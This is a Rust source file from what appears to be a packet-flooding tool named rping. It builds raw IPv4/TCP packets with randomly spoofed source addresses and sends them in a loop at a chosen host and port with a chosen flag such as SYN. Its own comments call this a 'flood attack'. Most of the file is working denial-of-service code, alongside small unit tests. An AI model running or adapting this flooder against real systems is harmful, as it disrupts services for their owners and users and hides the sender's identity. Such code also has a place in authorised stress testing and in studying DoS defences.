use crate::ip::IpHeader;
use crate::progress_bar::ProgressBar;
use crate::tcp::TcpHeader;
use rand::Rng;
use socket2::{Domain, Protocol, SockAddr, Socket, Type};
use std::net::{Ipv4Addr, SocketAddrV4};
use std::io;
use std::time::{Duration, Instant};
/// Initializes a raw socket for sending raw IP packets.
///
/// This function creates and configures a raw socket for sending raw IP packets using the `socket2` library.
/// The socket is configured with the specified destination IP address, destination port, and packet length.
///
/// # Arguments
///
/// * `dest_ip` - The destination IP address as a string.
/// * `dest_port` - The destination port number.
/// * `packet_len` - The total length of the raw IP packet.
///
/// # Returns
///
/// This function returns an `io::Result<Socket>`. It returns `Ok(Socket)` if the socket is successfully
/// created and configured, otherwise, it returns an `Err` containing the error information.
///
/// # Errors
///
/// This function may return an error if there are issues with socket creation, configuration, or connection.
///
/// # Examples
///
/// ```rust
/// use rping::utils::init_socket;
///
/// // Example usage of the init_socket function
/// let dest_ip = "192.168.0.2";
/// let dest_port = 8080;
/// let packet_len = 1500;
/// // let socket = init_socket(dest_ip, dest_port, packet_len).unwrap();
/// ```
pub fn init_socket(dest_ip: &str, dest_port: u16, packet_len: usize) -> io::Result<Socket> {
    let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6)))?;
    let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);
    socket.set_header_included(true)?;
    socket.connect(&SockAddr::from(dest_addr))?;
    socket.set_tos(0)?;
    socket.set_ttl(60)?;
    socket.set_send_buffer_size(packet_len)?;

    Ok(socket)
}

/// Generates a random IP address within the range [0.0.0.0, 255.255.255.255].
///
/// # Returns
///
/// (`u32`): The generated random IP address.
///
/// # Examples
///
/// ```
/// use rping::utils::generate_random_ip;
///
/// let random_ip = generate_random_ip();
/// ```
pub fn generate_random_ip() -> u32 {
    let min_ip: u32 = Ipv4Addr::new(0, 0, 0, 0).into();
    let max_ip: u32 = Ipv4Addr::new(255, 255, 255, 255).into();
    let random_ip: u32 = rand::thread_rng().gen_range(min_ip..=max_ip);
    random_ip
}

/// Creates a combined header by concatenating the bytes of IP and TCP headers.
///
/// # Arguments
///
/// * `ip_header` - The IP header.
/// * `tcp_header` - The TCP header.
///
/// # Returns
///
/// (`Vec<u8>`): The combined header bytes.
///
/// # Examples
///
/// ```
/// use rping::utils::{create_combined_header, generate_random_ip};
/// use rping::tcp::TcpHeader;
/// use rping::ip::IpHeader;
///
/// let source_ip = generate_random_ip();
/// let ip_header = IpHeader::new(source_ip, "192.168.0.1");
/// let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn", 1500);
///
/// let combined_header = create_combined_header(&ip_header, &tcp_header);
/// assert_eq!(combined_header.len(), std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>());
/// ```
pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> Vec<u8> {
    let ip_bytes = ip_header.as_bytes();
    let tcp_bytes = tcp_header.as_bytes();

    ip_bytes
        .iter()
        .cloned()
        .chain(tcp_bytes.iter().cloned())
        .collect()
}

/// Generates and sends TCP flood packets in a loop for a specified duration or number of packets
/// using a single socket per thread.
///
/// This function continuously generates TCP flood packets with random parameters and sends them.
/// It uses a loop to perform the following steps:
///
/// 1. Fill in the TCP header with random values.
/// 2. Fill in the IP header with random values and calculate the packet length.
/// 3. Calculate the TCP checksum.
/// 4. Combine the IP and TCP headers into a buffer.
/// 5. Send the spoofed packet using the previously initialized `socket` object.
/// 6. Repeat the above steps until the specified duration is reached or the specified number of packets is sent.
///
/// # Arguments
///
/// * `packet_len` - The length of each TCP packet.
/// * `dest_ip` - The target IP address.
/// * `dest_port` - The target port number.
/// * `flag` - The TCP flag to set in the packets (e.g., "syn", "ack", "fin").
/// * `duration` - The duration of the flood attack in minutes.
/// * `number` - The maximum number of packets to send. Set to `usize::MAX` for unlimited packets.
///
/// # Returns
///
/// This function does not return as it runs in an infinite loop. It continuously sends TCP flood packets until
/// the specified duration is reached or the specified number of packets is sent.
///
/// # Examples
///
/// ```rust
/// use rping::utils::tcp_flood;
///
/// // Example usage of the tcp_flood function
/// let packet_len = 1500;
/// let dest_ip = "192.168.1.10";
/// let dest_port = 80;
/// let flag = "syn";
/// let duration = 2;
/// let number = 100;
/// // tcp_flood(packet_len, dest_ip, dest_port, flag, duration, number);
/// ```
///
/// In this example, the `tcp_flood` function is used to send TCP flood packets with a packet length of 1500 bytes,
/// targeting the IP address "192.168.1.10" on port 80. The flood is configured to run for 2 minutes or until 100
/// packets are sent, whichever comes first.
pub fn tcp_flood(
    packet_len: usize,
    dest_ip: &str,
    dest_port: u16,
    flag: &str,
    duration: usize,
    number: usize,
) -> Result<(), Box<dyn std::error::Error>> {
    // Create a custom progress bar
    let mut progress_bar = ProgressBar::new(number, duration * 60);

    let start_time = Instant::now();
    let duration_limit = Duration::from_secs((duration * 60) as u64);

    // Initialize the socket. One socket per thread!
    let socket = init_socket(dest_ip, dest_port, packet_len)?;

    for i in 0..number {
        if start_time.elapsed() > duration_limit {
            break;
        }

        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, dest_ip);
        let tcp_header = TcpHeader::new(source_ip, dest_ip, dest_port, flag, packet_len);

        // Create the combined header slice
        let combined_header_slice = create_combined_header(&ip_header, &tcp_header);
        let mut buffer = vec![0u8; packet_len];
        buffer[..combined_header_slice.len()].copy_from_slice(&combined_header_slice);
        // Use the same socket for multiple packet transmissions
        socket.send_with_flags(&buffer, 2)?;

        // Increment the custom progress bar
        progress_bar.inc(i + 1);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_fill_ip_header() {
        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, "192.168.1.10");

        assert_eq!(ip_header.version_ihl, 0x45);
        assert_eq!(ip_header.protocol, 6);
    }

    #[test]
    fn test_create_combined_header() {
        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, "192.168.1.10");
        let tcp_header = TcpHeader::new(source_ip, "192.168.0.1", 80, "syn", 1500);

        let combined_header = create_combined_header(&ip_header, &tcp_header);

        assert_eq!(
            combined_header.len(),
            std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>()
        );

        assert_eq!(
            &combined_header[0..std::mem::size_of::<IpHeader>()],
            ip_header.as_bytes()
        );

        assert_eq!(
            combined_header[std::mem::size_of::<IpHeader>()..],
            tcp_header.as_bytes()
        );
    }
}
